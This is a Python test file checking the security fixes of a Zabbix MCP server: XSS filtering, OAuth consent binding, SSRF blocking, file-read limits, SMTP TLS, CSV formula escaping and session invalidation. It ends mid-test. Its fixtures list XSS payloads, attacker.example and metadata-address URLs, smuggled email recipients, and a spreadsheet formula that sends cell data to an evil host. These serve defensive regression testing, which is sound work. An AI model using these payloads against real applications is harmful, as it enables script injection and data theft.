#
# Zabbix MCP Server
# Copyright (C) 2026 initMAX s.r.o.
#
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU Affero General Public License as published by the Free
# Software Foundation, version 3.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for more
# details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
#

"""The findings of the security report on v1.42 (received 2026-11-06), one class each.

ZMCP-01 stored XSS in the template preview, ZMCP-02 OAuth consent not bound to the
browser that logged in, ZMCP-03 userdirectory.test (and user.login) open to a
read-only token, ZMCP-04 the server's AI key sent to a caller's api_base, ZMCP-05
any file read through report_logo; and the lower ones: SMTP without certificate
checks, the rate limit shared by all clients, WeasyPrint fetching file:// and
http(s)://, starting unauthenticated on a network address.
"""

import os
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from mcp.server.auth.provider import AuthorizationParams  # noqa: E402
from mcp.shared.auth import OAuthClientInformationFull  # noqa: E402
from pydantic import AnyUrl  # noqa: E402

from zabbix_mcp import oauth_login  # noqa: E402
from zabbix_mcp.admin.auth import hash_password  # noqa: E402
from zabbix_mcp.oauth_provider import ZmcpOAuthProvider, _PendingAuthorization  # noqa: E402

PASSWORD = "Operator_Pass_2026!"


class Form(dict):
    def getlist(self, key):
        v = self.get(key, [])
        return list(v) if isinstance(v, (list, tuple)) else [v]


# --------------------------------------------------------------------------- ZMCP-01

class TestTheTemplatePreviewIsSandboxed(unittest.TestCase):
    def test_the_preview_answer_carries_a_sandbox_policy(self):
        from zabbix_mcp.admin.views import templates
        response = templates._preview_response("<script>alert(1)</script>")
        policy = response.headers["content-security-policy"]
        self.assertTrue(policy.startswith("sandbox;"), policy)
        self.assertIn("default-src 'none'", policy)
        self.assertNotIn("allow-scripts", policy)
        self.assertNotIn("allow-same-origin", policy)

    def test_every_answer_of_the_preview_handler_goes_through_it(self):
        import inspect
        from zabbix_mcp.admin.views import templates
        source = inspect.getsource(templates.template_preview)
        self.assertNotIn("HTMLResponse(", source)
        self.assertGreaterEqual(source.count("_preview_response("), 4)

    def test_the_editor_shows_it_in_a_sandboxed_frame(self):
        page = (ROOT / "src/zabbix_mcp/admin/templates/report_templates/edit.html").read_text(encoding="utf-8")
        self.assertIn('<iframe id="preview-frame" sandbox=""', page)
        self.assertIn(".srcdoc = rendered", page)
        self.assertNotIn("doc.write(rendered)", page)

    def test_the_built_in_preview_is_sandboxed_too(self):
        page = (ROOT / "src/zabbix_mcp/admin/templates/report_templates/list.html").read_text(encoding="utf-8")
        self.assertIn('<iframe id="preview-iframe" sandbox=""', page)
        self.assertNotIn("doc.write(html)", page)

    def test_the_portal_sends_a_baseline_policy(self):
        from zabbix_mcp.admin import app
        self.assertIn(b"object-src 'none'", app._PORTAL_CSP)
        self.assertIn(b"base-uri 'self'", app._PORTAL_CSP)
        self.assertIn(b"frame-ancestors 'self'", app._PORTAL_CSP)


class TestMarkupThatRunsScriptIsNotSaved(unittest.TestCase):
    """The visual editor draws a template on the portal's own origin; its own filter is
    case-sensitive and lets an iframe with a javascript: src through (found in review)."""

    REFUSED = (
        '<div><iframe src="JavaScript:top.fetch(1)"></iframe></div>',
        "<SCRIPT>alert(1)</SCRIPT>",
        "<svg><script>alert(1)</script></svg>",
        '<img src=x onerror="alert(1)">',
        '<img src=x/onerror=alert(1)>',
        '<a href="  java\tscript:alert(1)">x</a>',
        '<a href="jav&#x61;script:alert(1)">x</a>',
        '<a href="jav&amp;#x61;script:alert(1)">x</a>',
        '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
        '<object data="data:text/html;base64,PHNjcmlwdD4=">',
        "<embed src=x>",
        '<base href="https://attacker.example/">',
        '<form><button formaction="javascript:alert(1)">x</button></form>',
        '<a href="VBScript:msgbox(1)">x</a>',
        '<div onmouseover = "x()">',
        # GrapesJS turns data-gjs-* into component properties; data-gjs-script runs (found by /security-review)
        '<div data-gjs-script="fetch(1)">Report</div>',
        "<div DATA-GJS-SCRIPT='x()'>a</div>",
        '<div data-gjs-script-props="x">a</div>',
    )

    def test_each_is_refused(self):
        from zabbix_mcp.admin.template_markup import refusal, unsafe_markup
        for markup in self.REFUSED:
            self.assertTrue(unsafe_markup(markup), markup)
            self.assertIn("may not contain markup that runs script", refusal(markup))

    def test_the_built_in_templates_and_ordinary_markup_pass(self):
        from zabbix_mcp.admin.template_markup import unsafe_markup
        for path in sorted((ROOT / "src/zabbix_mcp/reporting/templates").glob("*.html")):
            self.assertEqual(unsafe_markup(path.read_text(encoding="utf-8")), [], path.name)
        for markup in ('<img src="data:image/png;base64,AA==">', '<a href="https://example.com/x">',
                       "{% for h in hosts %}<td style=\"color: {{ h.c }}\">{{ h.name }}</td>{% endfor %}",
                       "<p>Contact: online support</p>", '<td class="one">x</td>'):
            self.assertEqual(unsafe_markup(markup), [], markup)

    def test_both_save_paths_and_the_ai_generator_use_it(self):
        import inspect
        from zabbix_mcp.admin.views import templates
        for handler in (templates.template_create, templates.template_edit):
            source = inspect.getsource(handler)
            self.assertIn("_template_refusal(html_content)", source, handler.__name__)
            self.assertNotIn("_validate_template_syntax(html_content)", source, handler.__name__)
        self.assertIn('"unsafe_markup"', inspect.getsource(templates.template_generate))
        self.assertIn('"unsafe_markup": bool(_unsafe(content))', inspect.getsource(templates.template_edit))

    def test_the_editor_keeps_such_a_template_out_of_the_visual_view(self):
        page = (ROOT / "src/zabbix_mcp/admin/templates/report_templates/edit.html").read_text(encoding="utf-8")
        self.assertIn("if (UNSAFE_MARKUP_FROM_SERVER || unsafeMarkup(initialContent))", page)
        self.assertIn("if (unsafeMarkup(txt))", page)
        self.assertIn("allowScripts: false, allowUnsafeAttr: false, allowUnsafeAttrValue: false", page)
        # every place that hands HTML to the visual editor is behind the check
        before = page.split("function switchTab")[1].split("editor.setComponents")[0]
        self.assertIn("unsafeMarkup(txt)", before)


# --------------------------------------------------------------------------- ZMCP-02

class TestTheConsentBelongsToTheBrowserThatLoggedIn(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.NamedTemporaryFile("w", suffix=".toml", delete=False)
        tmp.write(f'[admin.users.op]\npassword_hash = "{hash_password(PASSWORD)}"\nrole = "admin"\n')
        tmp.close()
        self.addCleanup(os.unlink, tmp.name)
        self.config = SimpleNamespace(_config_path=tmp.name)
        audit = patch("zabbix_mcp.admin.audit_writer.write_audit")
        self.audit = audit.start()
        self.addCleanup(audit.stop)
        oauth_login._oauth_login_limiter._attempts.clear() if hasattr(oauth_login._oauth_login_limiter, "_attempts") else None
        self.provider = ZmcpOAuthProvider(public_url="http://127.0.0.1:1", token_store=None)
        redirect = AnyUrl("https://attacker.example/cb")
        client = OAuthClientInformationFull(client_id="c", client_name="Claude Desktop", redirect_uris=[redirect])
        params = AuthorizationParams(state="s", scopes=["*"], code_challenge="x" * 43,
                                     redirect_uri=redirect, redirect_uri_provided_explicitly=True)
        self.pending = _PendingAuthorization(client, params)
        self.provider.stash_pending("req1", self.pending)

    def _login(self):
        response = oauth_login._handle_login_step(self.provider, self.pending, "req1",
                                                  Form(username="op", password=PASSWORD), "10.0.0.1", self.config)
        self.assertEqual(response.status_code, 200)
        cookie = next(v for k, v in response.raw_headers if k == b"set-cookie").decode()
        return response, cookie

    def _consent(self, nonce, ip="10.0.0.2"):
        return oauth_login._handle_consent_step(self.provider, self.pending, "req1",
                                                Form(action="allow", scope=["*"]), ip, nonce)

    def test_the_login_sets_a_cookie_that_scripts_and_other_sites_cannot_use(self):
        _, cookie = self._login()
        self.assertTrue(cookie.startswith(oauth_login.consent_cookie_name("req1") + "="))
        lowered = cookie.lower()
        for part in ("httponly", "samesite=strict", "path=/"):
            self.assertIn(part, lowered)
        age = int(lowered.split("max-age=")[1].split(";")[0])
        self.assertTrue(500 <= age <= 600, age)          # the pending request's lifetime

    def test_allow_without_that_cookie_is_refused(self):
        # the attack: the victim logged in through the attacker's link; the attacker posts "allow"
        self._login()
        for nonce in ("", "guessed", "x" * 43):
            response = self._consent(nonce)
            self.assertEqual(response.status_code, 403, nonce)
        self.assertEqual(self.provider._codes, {})
        self.assertIn("oauth.consent_rejected", [c.kwargs.get("action") for c in self.audit.call_args_list])

    def test_allow_from_the_browser_that_logged_in_goes_through(self):
        _, cookie = self._login()
        nonce = cookie.split(";")[0].split("=", 1)[1]
        response = self._consent(nonce, ip="10.0.0.1")
        self.assertEqual(response.status_code, 302)
        self.assertTrue(response.headers["location"].startswith("https://attacker.example/cb"))

    def test_two_logins_at_once_do_not_overwrite_each_other(self):
        self.assertNotEqual(oauth_login.consent_cookie_name("req1"), oauth_login.consent_cookie_name("req2"))

    def test_the_consent_form_posts_back_where_the_login_page_is(self):
        # no fixed action: a custom login_path or a proxy's path prefix is kept
        response, _ = self._login()
        page = response.body.decode()
        form = page[page.index('<form method="post"'):].split(">", 1)[0]
        self.assertNotIn("action=", form)

    def test_the_cookie_is_removed_once_used(self):
        _, cookie = self._login()
        nonce = cookie.split(";")[0].split("=", 1)[1]
        response = self._consent(nonce, ip="10.0.0.1")
        removed = [v.decode() for k, v in response.raw_headers if k == b"set-cookie"]
        self.assertTrue(any(c.startswith(oauth_login.consent_cookie_name("req1") + '=""') or "max-age=0" in c.lower()
                            for c in removed), removed)

    def test_a_second_login_gives_a_new_cookie_and_the_old_one_stops_working(self):
        _, first = self._login()
        _, second = self._login()
        old = first.split(";")[0].split("=", 1)[1]
        self.assertEqual(self._consent(old).status_code, 403)
        self.assertNotEqual(first, second)

    def test_the_consent_screen_names_where_the_access_goes(self):
        response, _ = self._login()
        page = response.body.decode()
        self.assertIn("Claude Desktop", page)
        self.assertIn("attacker.example", page)


# --------------------------------------------------------------------------- ZMCP-03

class TestMethodsThatAreNotReads(unittest.TestCase):
    def test_a_read_only_token_or_server_cannot_call_them(self):
        from zabbix_mcp.api import ALL_METHODS
        by_method = {m.api_method: m for m in ALL_METHODS}
        for method in ("userdirectory.test", "user.login"):
            self.assertFalse(by_method[method].read_only, method)

    def test_the_raw_tool_counts_them_as_writes_too(self):
        from zabbix_mcp.client import resend_is_safe
        self.assertFalse(resend_is_safe("userdirectory.test"))
        self.assertFalse(resend_is_safe("user.login"))
        self.assertTrue(resend_is_safe("userdirectory.get"))


# --------------------------------------------------------------------------- ZMCP-04

def _ai_config(api_base=""):
    return SimpleNamespace(admin_ai=SimpleNamespace(provider="openai", api_key="sk-server-secret", model="",
                                                    api_base=api_base, max_tokens=0, timeout=0))


class TestTheServerKeyStaysWithTheServerEndpoint(unittest.TestCase):
    def test_a_caller_api_base_without_a_caller_key_is_ignored(self):
        from zabbix_mcp.admin.ai_template import get_provider
        provider = get_provider(_ai_config(), override_api_base="https://attacker.example/v1")
        self.assertEqual(provider.api_key, "sk-server-secret")
        self.assertEqual(provider.base_url, "https://api.openai.com/v1")
        provider = get_provider(_ai_config("https://llm.internal.example/v1"), override_api_base="https://attacker.example/v1")
        self.assertEqual(provider.base_url, "https://llm.internal.example/v1")

    def test_a_caller_api_base_comes_with_the_caller_key_only(self):
        from zabbix_mcp.admin.ai_template import get_provider
        with patch("socket.getaddrinfo", return_value=[(socket.AF_INET, 0, 0, "", ("93.184.215.14", 443))]):
            provider = get_provider(_ai_config(), override_provider="openai", override_api_key="sk-callers-own",
                                    override_api_base="https://llm.example.com/v1")
        self.assertEqual((provider.api_key, provider.base_url), ("sk-callers-own", "https://llm.example.com/v1"))

    def test_a_caller_api_base_inside_the_network_is_refused(self):
        from zabbix_mcp.admin.ai_template import AIDisabledError, get_provider
        for address in ("127.0.0.1", "10.0.0.5", "192.168.90.3", "169.254.169.254", "::1", "fd00::1"):
            family = socket.AF_INET6 if ":" in address else socket.AF_INET
            with patch("socket.getaddrinfo", return_value=[(family, 0, 0, "", (address, 443))]):
                with self.assertRaises(AIDisabledError, msg=address):
                    get_provider(_ai_config(), override_provider="openai", override_api_key="k",
                                 override_api_base="https://name.example/v1?")
        with self.assertRaises(AIDisabledError):
            get_provider(_ai_config(), override_provider="openai", override_api_key="k", override_api_base="file:///etc/passwd")

    def test_the_configured_endpoint_may_be_local(self):
        # a self-hosted Ollama set by the administrator in config.toml
        from zabbix_mcp.admin.ai_template import get_provider
        provider = get_provider(_ai_config("http://127.0.0.1:11434/v1"), override_provider="ollama",
                                override_api_base="http://127.0.0.1:11434/v1")
        self.assertEqual(provider.base_url, "http://127.0.0.1:11434/v1")

    def test_a_redirect_is_not_followed(self):
        # a public endpoint that answers 302 to the cloud metadata address
        import http.server
        import threading
        hits = []

        class Redirect(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                self.rfile.read(int(self.headers.get("Content-Length") or 0))   # read the request, as a server does
                hits.append(self.path)
                self.send_response(302)
                self.send_header("Location", "http://127.0.0.1:9/latest/meta-data/")
                self.send_header("Content-Length", "0")
                self.end_headers()

            def log_message(self, *args):
                pass

        server = http.server.HTTPServer(("127.0.0.1", 0), Redirect)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.shutdown)
        from zabbix_mcp.admin.ai_template import AIProviderError, OpenAIProvider
        with self.assertRaises(AIProviderError) as raised:
            OpenAIProvider(api_key="k", base_url=f"http://127.0.0.1:{server.server_port}/v1").generate("s", "u")
        self.assertIn("302", str(raised.exception))
        self.assertEqual(hits, ["/v1/chat/completions"])

    def test_a_callers_endpoint_must_connect_to_a_public_address(self):
        # checked on the connection itself, so a name that resolves elsewhere the second time
        # (DNS rebinding) is caught as well
        import http.server
        import threading

        class Answer(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                self.rfile.read(int(self.headers.get("Content-Length") or 0))
                body = b'{"choices": [{"message": {"content": "<p>x</p>"}}]}'
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        server = http.server.HTTPServer(("127.0.0.1", 0), Answer)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.shutdown)
        from zabbix_mcp.admin.ai_template import AIProviderError, OpenAIProvider
        base = f"http://127.0.0.1:{server.server_port}/v1"
        self.assertEqual(OpenAIProvider(api_key="k", base_url=base).generate("s", "u"), "<p>x</p>")   # configured: allowed
        with self.assertRaises(AIProviderError) as raised:
            OpenAIProvider(api_key="k", base_url=base, public_only=True).generate("s", "u")
        self.assertIn("not reachable at a public address", str(raised.exception))

    def test_a_proxy_is_not_used_for_a_callers_endpoint(self):
        # through a proxy the address checked would be the proxy's
        from zabbix_mcp.admin import ai_template
        with patch.dict(os.environ, {"http_proxy": "http://127.0.0.1:9", "https_proxy": "http://127.0.0.1:9"}):
            opener = MagicMock()
            with patch.object(ai_template.urllib_request, "build_opener", return_value=opener) as build:
                ai_template._open("req", 5, public_only=True)
        handlers = build.call_args.args
        proxies = [h for h in handlers if isinstance(h, ai_template.urllib_request.ProxyHandler)]
        self.assertEqual([p.proxies for p in proxies], [{}])

    def test_a_reply_without_content_is_not_handed_back_either(self):
        from zabbix_mcp.admin.ai_template import AIProviderError, OpenAIProvider
        reply = MagicMock()
        reply.__enter__.return_value.read.return_value = b'{"Code": "Success", "SecretAccessKey": "s3cr3t"}'
        with patch("zabbix_mcp.admin.ai_template._open", return_value=reply):
            with self.assertRaises(AIProviderError) as raised:
                OpenAIProvider(api_key="k", base_url="https://x/v1").generate("s", "u")
        self.assertNotIn("s3cr3t", str(raised.exception))

    def test_get_provider_marks_a_callers_endpoint(self):
        from zabbix_mcp.admin.ai_template import get_provider
        with patch("socket.getaddrinfo", return_value=[(socket.AF_INET, 0, 0, "", ("93.184.215.14", 443))]):
            own = get_provider(_ai_config(), override_provider="openai", override_api_key="k",
                               override_api_base="https://llm.example.com/v1")
        self.assertTrue(own.public_only)
        self.assertFalse(get_provider(_ai_config()).public_only)

    def test_an_upstream_error_body_is_not_handed_back(self):
        from urllib.error import HTTPError
        from zabbix_mcp.admin.ai_template import AIProviderError, OpenAIProvider
        error = HTTPError("https://x/v1/chat/completions", 500, "err", {}, None)
        error.read = lambda: b"internal-service-secret-body"
        with patch("zabbix_mcp.admin.ai_template._open", side_effect=error):
            with self.assertRaises(AIProviderError) as raised:
                OpenAIProvider(api_key="k", base_url="https://x/v1").generate("s", "u")
        self.assertNotIn("internal-service-secret-body", str(raised.exception))
        self.assertIn("500", str(raised.exception))


# --------------------------------------------------------------------------- ZMCP-05

class TestTheLogoIsAnImageFromTheUpload(unittest.TestCase):
    def test_the_settings_form_cannot_set_the_path(self):
        from zabbix_mcp.admin.views.settings import SECTION_CONFIG
        for section in SECTION_CONFIG.values():
            self.assertNotIn("report_logo", section["allowed_keys"])

    def test_the_preview_reads_images_only(self):
        from zabbix_mcp.reporting.engine import _read_logo_as_base64
        with tempfile.TemporaryDirectory() as tmp:
            config = Path(tmp) / "config.toml"
            config.write_text('[zabbix.x]\napi_token = "secret"\n')
            self.assertIsNone(_read_logo_as_base64(str(config)))
            png = Path(tmp) / "logo.png"
            png.write_bytes(b"\x89PNG\r\n\x1a\n")
            self.assertTrue(_read_logo_as_base64(str(png)).startswith("data:image/png;base64,"))
            link = Path(tmp) / "link.png"
            link.symlink_to(config)
            self.assertIsNone(_read_logo_as_base64(str(link)))

    def test_the_preview_uses_that_reader(self):
        import inspect
        from zabbix_mcp.admin.views import templates
        source = inspect.getsource(templates.template_preview)
        self.assertIn("_read_logo_as_base64(configured_logo)", source)
        self.assertNotIn("configured_path.read_bytes()", source)


# --------------------------------------------------------------------------- lower ones

class TestSmtpChecksTheCertificate(unittest.TestCase):
    def test_on_by_default_and_off_only_when_asked(self):
        from zabbix_mcp.config import ReportEmailConfig
        from zabbix_mcp.reporting.delivery import smtp_tls_context
        self.assertTrue(ReportEmailConfig().verify_tls)
        checked = smtp_tls_context()
        self.assertEqual((checked.verify_mode, checked.check_hostname), (ssl.CERT_REQUIRED, True))
        unchecked = smtp_tls_context(False)
        self.assertEqual((unchecked.verify_mode, unchecked.check_hostname), (ssl.CERT_NONE, False))

    def _send(self, **email):
        from zabbix_mcp.config import ReportEmailConfig
        from zabbix_mcp.reporting import delivery
        config = ReportEmailConfig(enabled=True, smtp_host="smtp.example.com", from_address="a@example.com",
                                   allowed_recipients=["*@example.com"], **email)
        with patch.object(delivery.smtplib, "SMTP") as plain, patch.object(delivery.smtplib, "SMTP_SSL") as implicit:
            delivery.send_report_email(b"%PDF", "r.pdf", ["b@example.com"], email_config=config, subject="s", body="b")
        return plain, implicit

    def test_starttls_and_implicit_tls_get_the_context(self):
        plain, _ = self._send()
        context = plain.return_value.starttls.call_args.kwargs["context"]
        self.assertEqual(context.verify_mode, ssl.CERT_REQUIRED)
        _, implicit = self._send(use_ssl=True)
        self.assertEqual(implicit.call_args.kwargs["context"].verify_mode, ssl.CERT_REQUIRED)
        plain, _ = self._send(verify_tls=False)
        self.assertEqual(plain.return_value.starttls.call_args.kwargs["context"].verify_mode,
                         ssl.CERT_NONE)

    def test_the_option_is_in_the_portal(self):
        from zabbix_mcp.admin.views.settings import BOOL_KEYS, SECTION_CONFIG
        self.assertIn("verify_tls", SECTION_CONFIG["report_email"]["allowed_keys"])
        self.assertIn("verify_tls", BOOL_KEYS)
        page = (ROOT / "src/zabbix_mcp/admin/templates/settings.html").read_text(encoding="utf-8")
        self.assertIn('name="verify_tls"', page)

    def test_the_config_reads_it(self):
        from zabbix_mcp.config import load_config
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "c.toml"
            path.write_text('[server]\ntransport = "stdio"\n[zabbix.x]\nurl = "https://z"\napi_token = "t"\n'
                            '[reporting.email]\nenabled = true\nsmtp_host = "s"\nfrom_address = "a@b.c"\n'
                            'allowed_recipients = ["*@b.c"]\nverify_tls = false\n')
            self.assertFalse(load_config(str(path)).reporting.email.verify_tls)


class TestTheRateLimitIsPerClient(unittest.TestCase):
    def test_each_token_has_its_own_count(self):
        from zabbix_mcp import client as client_module
        from zabbix_mcp.token_store import current_client_ip, current_token_info
        limiter = client_module._RateLimiter(2)
        for name in ("a", "b"):
            reset = current_token_info.set(SimpleNamespace(id=name))
            try:
                limiter.check(client_module._calling_client())
                limiter.check(client_module._calling_client())
            finally:
                current_token_info.reset(reset)
        reset = current_token_info.set(SimpleNamespace(id="a"))
        try:
            with self.assertRaises(client_module.RateLimitError):
                limiter.check(client_module._calling_client())
        finally:
            current_token_info.reset(reset)
        # without a token one shared count, whatever address the client comes from
        reset = current_client_ip.set("10.0.0.9")
        try:
            self.assertIsNone(client_module._calling_client())
        finally:
            current_client_ip.reset(reset)
        self.assertIsNone(client_module._calling_client())

    def test_the_call_passes_it(self):
        import inspect
        from zabbix_mcp.client import ClientManager
        self.assertIn("self._rate_limiter.check(_calling_client())", inspect.getsource(ClientManager.call))


class TestReportsLoadDataUrisOnly(unittest.TestCase):
    def test_the_function_form(self):
        from zabbix_mcp.reporting import engine
        fake = SimpleNamespace(default_url_fetcher=MagicMock(return_value={"string": b"x"}))
        with patch.object(engine, "weasyprint", fake, create=True):
            fetcher = engine._report_url_fetcher()
            self.assertIs(fetcher, engine._data_uri_fetcher)
            for url in ("file:///etc/zabbix-mcp/config.toml", "http://169.254.169.254/", "https://x/a.css"):
                with self.assertRaises(ValueError, msg=url):
                    fetcher(url)
            self.assertEqual(fetcher("data:image/png;base64,AA=="), {"string": b"x"})

    def test_the_object_form_of_weasyprint_68_and_later(self):
        from zabbix_mcp.reporting import engine
        made = MagicMock()
        with patch.object(engine, "weasyprint", SimpleNamespace(URLFetcher=made), create=True):
            engine._report_url_fetcher()
        made.assert_called_once_with(allowed_protocols={"data"})


class TestRequireAuth(unittest.TestCase):
    def _start(self, host, extra=""):
        with tempfile.TemporaryDirectory() as tmp:
            cfg = Path(tmp) / "c.toml"
            cfg.write_text(f'[server]\ntransport = "http"\nhost = "{host}"\nport = 1\nrequire_auth = true\n'
                           f'log_file = "{tmp}/s.log"\n{extra}\n[admin]\nenabled = false\n'
                           '[zabbix.x]\nurl = "https://127.0.0.1:65535"\napi_token = "t"\nverify_ssl = false\n')
            env = dict(os.environ, PYTHONPATH=str(ROOT / "src"))
            return subprocess.run([sys.executable, "-c", "from zabbix_mcp.cli import main; main()", "--config", str(cfg)],
                                  capture_output=True, text=True, timeout=60, env=env)

    def test_it_refuses_to_start_open_on_a_network_address(self):
        done = self._start("0.0.0.0")
        self.assertNotEqual(done.returncode, 0)
        self.assertIn("require_auth is on", done.stdout + done.stderr)

    def test_the_option_is_in_the_portal(self):
        from zabbix_mcp.admin.views.settings import BOOL_KEYS, RESTART_REQUIRED, SECTION_CONFIG
        self.assertIn("require_auth", SECTION_CONFIG["tls_access"]["allowed_keys"])
        self.assertIn("require_auth", BOOL_KEYS)
        self.assertIn("require_auth", RESTART_REQUIRED)

    def test_off_by_default(self):
        from zabbix_mcp.config import ServerConfig
        self.assertFalse(ServerConfig().require_auth)


# --------------------------------------------------------------------------- found in the follow-up audit

class TestValuesInInlineHandlers(unittest.TestCase):
    """A name inside onclick="...('{{ name }}')" is HTML-escaped, and the browser undoes
    that before it runs the handler: a ' in an OAuth client name (registration needs no
    login) or a template's display name ended the string and ran code as an admin."""

    def test_no_template_value_sits_inside_a_quoted_js_string_in_a_handler(self):
        import re
        handler = re.compile(r'\son[a-z]+="([^"]*)"')
        for page in (ROOT / "src/zabbix_mcp/admin/templates").rglob("*.html"):
            for match in handler.finditer(page.read_text(encoding="utf-8")):
                code = match.group(1)
                for literal in re.findall(r"'[^']*'", code):
                    self.assertNotIn("{{", literal, f"{page.name}: {code[:120]}")

    def test_the_form_used_is_a_json_literal_once_the_browser_decodes_it(self):
        import html
        import json
        from jinja2 import Environment
        env = Environment(autoescape=True)
        page = env.from_string("""<button onclick="confirmDelete('template ' + {{ name | tojson | forceescape }})">""")
        for name in ("Claude'+alert(1)+'", 'a"b', "</script><script>alert(1)</script>", "x\\'y"):
            attribute = page.render(name=name).split('onclick="', 1)[1].rsplit('"', 1)[0]
            code = html.unescape(attribute)          # what the browser runs
            literal = code[len("confirmDelete('template ' + "):-1]
            self.assertEqual(json.loads(literal), name)
            self.assertNotIn('"', attribute)


class TestReportMailGoesToTheCheckedAddressesOnly(unittest.TestCase):
    def test_only_one_bare_address_can_match_the_allowlist(self):
        from zabbix_mcp.reporting.delivery import recipient_allowed
        allowed = ["*@example.com"]
        self.assertTrue(recipient_allowed("ops@example.com", allowed))
        self.assertTrue(recipient_allowed(" Ops@Example.com ", allowed))
        for sneaky in ("attacker@evil.test x@example.com", "<attacker@evil.test> x@example.com",
                       "g: attacker@evil.test; x@example.com", "Name <x@example.com>", "a@evil.test,x@example.com",
                       "attacker@evil.test\nx@example.com", '"a@evil.test"@example.com'):
            self.assertFalse(recipient_allowed(sneaky, allowed), sneaky)

    def test_the_envelope_is_the_checked_list(self):
        from zabbix_mcp.config import ReportEmailConfig
        from zabbix_mcp.reporting import delivery
        config = ReportEmailConfig(enabled=True, smtp_host="smtp.example.com", from_address="a@example.com",
                                   allowed_recipients=["*@example.com"])
        with patch.object(delivery.smtplib, "SMTP") as plain:
            delivery.send_report_email(b"%PDF", "r.pdf", ["b@example.com"], email_config=config, subject="s", body="b")
        self.assertEqual(plain.return_value.send_message.call_args.kwargs["to_addrs"], ["b@example.com"])
        with self.assertRaises(delivery.DeliveryError):
            delivery.send_report_email(b"%PDF", "r.pdf", ["attacker@evil.test x@example.com"], email_config=config,
                                       subject="s", body="b")


class TestAuditExportHasNoFormulas(unittest.TestCase):
    def test_a_cell_that_would_be_a_formula_is_text(self):
        from zabbix_mcp.admin.views.audit import _csv_cell
        for value in ('=HYPERLINK("http://evil/?"&A1,"x")', "+1", "-cmd", "@SUM(A1)", "\tx", "\rx"):
            self.assertEqual(_csv_cell(value), "'" + value)
        for value in ("admin", "login_failed", "10.0.0.1", ""):
            self.assertEqual(_csv_cell(value), value)
        self.assertEqual(_csv_cell(None), "")


# --------------------------------------------------------------------------- portal sessions, CSRF, tokens

def _asgi(app, method, path, *, cookies="", body=b"", headers=()):
    """One request through an ASGI app; (status, headers dict, body)."""
    import asyncio
    sent = []
    hdrs = [(b"host", b"127.0.0.1"), (b"content-type", b"application/x-www-form-urlencoded")] + list(headers)
    if cookies:
        hdrs.append((b"cookie", cookies.encode()))
    scope = {"type": "http", "method": method, "path": path, "raw_path": path.encode(), "query_string": b"",
             "headers": hdrs, "client": ("127.0.0.1", 50000), "server": ("127.0.0.1", 80), "scheme": "http",
             "http_version": "1.1", "root_path": ""}
    chunks = [{"type": "http.request", "body": body, "more_body": False}]

    async def receive():
        return chunks.pop(0) if chunks else {"type": "http.disconnect"}

    async def send(message):
        sent.append(message)

    asyncio.run(app(scope, receive, send))
    start = next(m for m in sent if m["type"] == "http.response.start")
    return start["status"], {k.decode(): v.decode() for k, v in start.get("headers", [])}, \
        b"".join(m.get("body", b"") for m in sent if m["type"] == "http.response.body")


class TestPortalSessionsFollowTheUser(unittest.TestCase):
    """A deleted, demoted or re-passworded user was still logged in for 8 hours (and a
    deleted admin could create a new admin); a second admin_session cookie in front of
    the real one skipped the CSRF check."""

    def setUp(self):
        from zabbix_mcp.admin.app import AdminApp
        from zabbix_mcp.config import load_config
        from zabbix_mcp.token_store import TokenStore
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.path = str(Path(self.dir.name) / "config.toml")
        self.hash = hash_password(PASSWORD)
        Path(self.path).write_text(
            '[server]\ntransport = "http"\nhost = "127.0.0.1"\nport = 8080\n'
            '[zabbix.main]\nurl = "https://zabbix.example.com"\napi_token = "dummy"\n'
            f'[admin.users.victim]\npassword_hash = "{self.hash}"\nrole = "admin"\n'
            f'[admin.users.other]\npassword_hash = "{self.hash}"\nrole = "admin"\n')
        audit = patch("zabbix_mcp.admin.audit_writer.write_audit")
        audit.start()
        self.addCleanup(audit.stop)
        self.admin = AdminApp(config=load_config(self.path), config_path=self.path, client_manager=MagicMock(),
                              token_store=TokenStore(), oauth_provider=None)

    def _login(self, user="victim"):
        from urllib.parse import urlencode
        status, headers, _ = _asgi(self.admin.app, "POST", "/login",
                                   body=urlencode({"username": user, "password": PASSWORD}).encode())
        self.assertEqual(status, 303)
        return headers["set-cookie"].split(";")[0].split("=", 1)[1]

    def _session(self, token):
        request = SimpleNamespace(cookies={"admin_session": token})
        return self.admin._get_session(request)

    def _rewrite(self, old, new):
        text = Path(self.path).read_text().replace(old, new)
        time.sleep(0.01)
        Path(self.path).write_text(text)
        os.utime(self.path, None)

    def test_a_deleted_user_is_logged_out_at_once(self):
        token = self._login()
        self.assertIsNotNone(self._session(token))
        self._rewrite(f'[admin.users.victim]\npassword_hash = "{self.hash}"\nrole = "admin"\n', "")
        self.assertIsNone(self._session(token))
        self.assertIsNone(self.admin.sessions.validate_session(token))          # gone, not just refused

    def test_a_demoted_user_is_logged_out(self):
        token = self._login()
        self._rewrite('[admin.users.victim]\npassword_hash = "' + self.hash + '"\nrole = "admin"',
                      '[admin.users.victim]\npassword_hash = "' + self.hash + '"\nrole = "viewer"')
        self.assertIsNone(self._session(token))

    def test_a_password_changed_by_somebody_else_logs_the_user_out(self):
        token = self._login()
        self._rewrite(f'[admin.users.victim]\npassword_hash = "{self.hash}"',
                      f'[admin.users.victim]\npassword_hash = "{hash_password("Another_Pass_2026!")}"')
        self.assertIsNone(self._session(token))

    def test_other_users_keep_their_sessions(self):
        mine, theirs = self._login("victim"), self._login("other")
